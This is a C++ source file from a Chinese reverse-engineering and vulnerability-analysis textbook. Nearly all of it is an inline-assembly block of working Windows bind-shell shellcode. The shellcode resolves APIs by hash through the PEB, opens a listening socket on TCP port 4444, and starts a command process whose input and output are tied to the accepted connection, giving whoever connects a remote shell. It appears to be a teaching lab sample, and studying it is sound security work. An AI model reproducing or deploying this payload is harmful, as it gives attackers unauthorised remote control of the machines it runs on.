/*-----------------------------------------------------------------------
第14章  漏洞分析技术
《加密与解密（第四版）》
(c)  看雪学院 www.kanxue.com 2000-2018
-----------------------------------------------------------------------*/

// BindPort.cpp : Defines the entry point for the console application.
//实验环境：
//windows xp sp3 + VC6.0 
//编译选项：Debug（默认配置）


#include "stdafx.h"
#include <stdio.h>

int main(int argc, char* argv[])
{
	
	__asm
	{
		         //int 3      ;
		         cld
                 call    sc_00421AD3
                 push    ebx
                 push    ebp
                 push    esi
                 push    edi
                 mov     ebp, dword ptr [esp+018h]
                 mov     eax, dword ptr [ebp+03Ch]
                 mov     edx, dword ptr [ebp+eax+078h]
                 add     edx, ebp
                 mov     ecx, dword ptr [edx+018h]
                 mov     ebx, dword ptr [edx+020h]
                 add     ebx, ebp
sc_00421A96:     jecxz   sc_00421ACA
                 dec     ecx
                 mov     esi, dword ptr [ebx+ecx*4]
                 add     esi, ebp
                 xor     edi, edi
                 cld
sc_00421AA1:     xor     eax, eax
                 lods    byte ptr [esi]
                 cmp     al, ah
                 je      sc_00421AAF
                 ror     edi, 0Dh
                 add     edi, eax
                 jmp     sc_00421AA1
sc_00421AAF:     cmp     edi, dword ptr [esp+014h]
                 jnz     sc_00421A96
                 mov     ebx, dword ptr [edx+024h]
                 add     ebx, ebp
                 mov     cx, word ptr [ebx+ecx*2]
                 mov     ebx, dword ptr [edx+01Ch]
                 add     ebx, ebp
                 mov     eax, dword ptr [ebx+ecx*4]
                 add     eax, ebp
                 jmp     sc_00421ACC
sc_00421ACA:     xor     eax, eax
sc_00421ACC:     pop     edi
                 pop     esi
                 pop     ebp
                 pop     ebx
                 retn    08h
sc_00421AD3:     pop     esi
                 push    030h
                 pop     ecx
                 mov     ebx, dword ptr fs:[ecx]
                 mov     ebx, dword ptr [ebx+0Ch]
                 mov     ebx, dword ptr [ebx+01Ch]
                 mov     ebx, dword ptr [ebx]
                 mov     ebx, dword ptr [ebx+08h]
                 push    ebx
                 push    0EC0E4E8Eh
                 call    esi
                 mov     edi, eax
                 sub     esp, 0100h
                 push    edi
                 push    esi
                 push    ebx
                 mov     ebp, esp
                 call    sc_00421B26
                 //0x90,  0x01,  0x00,  0x00
				 //0xB6,  0x19,  0x18,  0xE7
				 //0xA4,  0x19,  0x70,  0xE9
				 //0xE5,  0x49,  0x86,  0x49
				 //0xA4,  0x1A,  0x70,  0xC7
				 //0xA4,  0xAD,  0x2E,  0xE9
				 //0xD9,  0x09,  0xF5,  0xAD
				 //0xCB,  0xED,  0xFC,  0x3B
				 //0x57,  0x53,  0x32,  0x5F
				 //0x33,  0x32,  0x00,  
sc_00421B26:     pop     ebx
                 lea     ecx, dword ptr [ebx+020h]
                 push    ecx
                 call    edi
                 mov     edi, ebx
                 mov     ebx, eax
                 lea     esi, dword ptr [ebp+014h]
                 push    07h
                 pop     ecx
sc_00421B37:     push    ecx
                 push    ebx
                 push    dword ptr [edi+ecx*4]
                 call    dword ptr [ebp+04h]
                 pop     ecx
                 mov     dword ptr [esi+ecx*4], eax
                 loop    sc_00421B37
                 sub     esp, dword ptr [edi]
                 push    esp
                 push    dword ptr [edi]
                 call    dword ptr [ebp+030h]
                 xor     eax, eax
                 push    eax
                 push    eax
                 push    eax
                 push    eax
                 inc     eax
                 push    eax
                 inc     eax
                 push    eax
                 call    dword ptr [ebp+02Ch]
                 mov     edi, eax
                 xor     ebx, ebx
                 push    ebx
                 push    ebx
                 push    05C110002h
                 mov     eax, esp
                 push    010h
                 push    eax
                 push    edi
                 call    dword ptr [ebp+024h]
                 push    ebx
                 push    edi
                 call    dword ptr [ebp+028h]
                 push    ebx
                 push    esp
                 push    edi
                 call    dword ptr [ebp+020h]
                 mov     edi, eax
                 push    012345678h
                 mov     ebx, esp
                 xchg    edx, edi
                 xor     eax, eax
                 lea     edi, dword ptr [esp-054h]
                 push    015h
                 pop     ecx
                 rep     stos dword ptr es:[edi]
                 xchg    edx, edi
                 sub     esp, 054h
                 mov     byte ptr [esp+010h], 044h
                 mov     word ptr [esp+03Ch], 0101h
                 mov     dword ptr [esp+048h], edi
                 mov     dword ptr [esp+04Ch], edi
                 mov     dword ptr [esp+050h], edi
                 lea     eax, dword ptr [esp+010h]
                 push    esp
                 push    eax
                 push    ecx
                 push    ecx
                 push    ecx
                 inc     ecx
                 push    ecx
                 dec     ecx
                 push    ecx
                 push    ecx
                 push    ebx
                 push    ecx
                 push    dword ptr [ebp]
                 push    016B3FE72h
                 call    dword ptr [ebp+04h]
                 call    eax
                 mov     esi, esp
                 push    dword ptr [ebp]
                 push    0CE05D9ADh
                 call    dword ptr [ebp+04h]
                 mov     ebx, eax
                 push    -01h
                 push    dword ptr [esi]
                 call    ebx
                 push    dword ptr [ebp]
                 push    05F048AF0h
                 call    dword ptr [ebp+04h]
                 xor     ebx, ebx
                 push    ebx
                 call    eax
	}
	return 0;
}

